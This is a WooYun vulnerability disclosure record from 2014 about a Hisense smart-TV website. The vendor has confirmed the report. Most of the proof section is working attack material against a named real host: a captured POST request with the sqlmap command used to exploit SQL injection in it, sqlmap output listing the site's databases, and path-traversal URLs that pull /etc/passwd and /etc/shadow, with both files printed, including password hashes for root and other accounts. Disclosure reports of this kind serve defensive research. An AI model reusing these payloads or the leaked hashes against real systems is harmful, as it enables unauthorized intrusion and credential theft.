{"id": 42607, "wybug_id": "wooyun-2014-085210", "wybug_title": "海信某网站存在SQL注入及任意文件下载", "wybug_corp": "hisense.com", "wybug_author": "sunding", "wybug_date": "2014-12-01 11:03", "wybug_open_date": "2015-01-15 11:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-15：\t细节向公众公开  简要描述：  详细说明：  海信某网站存在SQL注入及任意文件下载   漏洞证明：  1、POST型SQL注入存在SQL注入的站点www.hismarttv.com/ajax/getHotAppList.jspxPOST /ajax/getHotAppList.jspx HTTP/1.1Content-Length: 128Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://www.hismarttv.com/Cookie: clientlanguage=zh_CN; JSESSIONID=99AB9560CEE6E74E5918D9FD358E7D29; APP_STORE_SELECT_MSG=82%2C003; _error_remaining=0Host: www.hismarttv.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*appId=9000000104031&count=7&deviceCode=&deviceType=003&PageNo=0&t=0.40499216807074845&type=3注入点appId和deviceCode以appId为例，将以上POST请求存入txt文本Sqlmap py -r 2.txt -p \"appId\" --dbs --current-user --current-dbsqlmap identified the following injection points with a total of 62 HTTP(s) requests:---Place: POSTParameter: appId    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: appId=9000000104031 AND 2182=2182&count=7&deviceCode=&deviceType=003&PageNo=0&t=0.40499216807074845&type=3---[10:00:39] [INFO] testing MySQL[10:00:39] [INFO] confirming MySQL[10:00:40] [INFO] the back-end DBMS is MySQLweb application technology: JSP, Apache 2.2.15back-end DBMS: MySQL >= 5.0.0[10:00:40] [INFO] fetching current user[10:00:40] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[10:00:40] [INFO] retrieved: hitv@%current user:    'hitv@%'[10:00:50] [INFO] fetching current database[10:00:50] [INFO] retrieved: asopcurrent database:    'asop'[10:00:57] [INFO] fetching database names[10:00:57] [INFO] fetching number of databases[10:00:57] [INFO] retrieved: 8[10:00:58] [INFO] retrieved: information_schema[10:01:24] [INFO] retrieved: asop[10:01:31] [INFO] retrieved: backup[10:01:41] [INFO] retrieved: hitv[10:01:47] [INFO] retrieved: #mysql50#lost+fouhd[10:02:30] [INFO] retrieved: mysql[10:02:36] [INFO] retrieved: performance_schema[10:02:56] [INFO] retrieved: testavailable databases [8]:[*] `#mysql50#lost+fouhd`[*] asop[*] backup[*] hitv[*] information_schema[*] mysql[*] performance_schema[*] test2、任意文件下载http://www.hismarttv.com/DownloadServlet?contentId=217&downFile=../../../../../../../../../../etc/passwd&fileSize=&flag=1&userName=adminhttp://www.hismarttv.com/DownloadServlet?contentId=217&downFile=../../../../../../../../../../etc/shadow&fileSize=&flag=1&userName=adminroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/bin/bashdaemon:x:2:2:Daemon:/sbin:/bin/bashlp:x:4:7:Printing daemon:/var/spool/lpd:/bin/bashmail:x:8:12:Mailer daemon:/var/spool/clientmqueue:/bin/falsegames:x:12:100:Games account:/var/games:/bin/bashwwwrun:x:30:8:WWW daemon apache:/var/lib/wwwrun:/bin/falseftp:x:40:49:FTP account:/srv/ftp:/bin/bashnobody:x:65534:65533:nobody:/var/lib/nobody:/bin/bashmessagebus:x:100:101:User for D-BUS:/var/run/dbus:/bin/falsehaldaemon:x:101:102:User for haldaemon:/var/run/hal:/bin/falseat:x:25:25:Batch jobs daemon:/var/spool/atjobs:/bin/bashsshd:x:71:65:SSH daemon:/var/lib/sshd:/bin/falsepostfix:x:51:51:Postfix Daemon:/var/spool/postfix:/bin/falsentp:x:74:103:NTP daemon:/var/lib/ntp:/bin/falsehacluster:x:90:90:heartbeat processes:/var/lib/heartbeat/cores/hacluster:/bin/falsegdm:x:50:104:Gnome Display Manager daemon:/var/lib/gdm:/bin/falsesuse-ncc:x:102:105:Novell Customer Center User:/var/lib/YaST2/suse-ncc-fakehome:/bin/bashhitv:x:888:800::/usr/local/fountain/hitv:/bin/cshshinedb:x:999:800::/usr/local/fountain/shinedb:/bin/cshnagios:x:1000:1000::/home/nagios:/bin/bashman:x:13:62:Manual pages viewer:/var/cache/man:/bin/bashnews:x:9:13:News system:/etc/news:/bin/bashuucp:x:10:14:Unix-to-Unix CoPy system:/etc/uucp:/bin/bashpolkituser:x:103:107:PolicyKit:/var/run/PolicyKit:/bin/falseuuidd:x:104:109:User for uuidd:/var/run/uuidd:/bin/falsepuppet:x:105:110:Puppet daemon:/var/lib/puppet:/bin/falsepulse:x:106:111:PulseAudio daemon:/var/lib/pulseaudio:/bin/falsemysqlbackup:x:1001:100::/home/mysqlbackup:/bin/bashroot:$2y$10$wcDjIlJ2n3R3TrXLcIqZ6eoyzlZgxDEClVO5r5te0dFdMnM.bopbq:16310::::::bin:*:15203::::::daemon:*:15203::::::lp:*:15203::::::mail:*:15203::::::news:*:15203::::::uucp:*:15203::::::games:*:15203::::::man:*:15203::::::wwwrun:*:15203::::::ftp:*:15203::::::nobody:*:15203::::::at:!:15203:0:99999:7:::sshd:!:15203:0:99999:7:::postfix:!:15203:0:99999:7:::ntp:!:15203:0:99999:7:::hacluster:!:15203:0:99999:7:::gdm:!:15203:0:99999:7:::suse-ncc:!:15203:0:99999:7:::hitv:$2a$10$d2gy9nH4pf1aeOBr5MYSNeKjmi4QoSWjx1S7yx/AvQ1w5..G7gfva:15223:0:99999:7:::shinedb:$2a$10$DSyULJr5CTxi2f5IQeUM6.3Rpaj8hl5kFKSJs0m3/9nhuIWw/BTgm:15223:0:99999:7:::nagios:!:15540:0:99999:7:::polkituser:*:15874:0:99999:7:::uuidd:*:15874:0:99999:7:::puppet:*:15874:0:99999:7:::pulse:*:15874:0:99999:7:::mysqlbackup:$2y$10$o9qaQzFUzEt.hnW/AbTGqugKDIHZAeKd2igOjdbu.DYsPrD31kYtO:16286:0:99999:7:::   修复方案：  1、过滤特殊字符2、限制目录访问   版权声明：转载请注明来源 sunding@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-12-01 13:28 厂商回复： 感谢您的安全报告，我们已安排专人进行跟踪修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}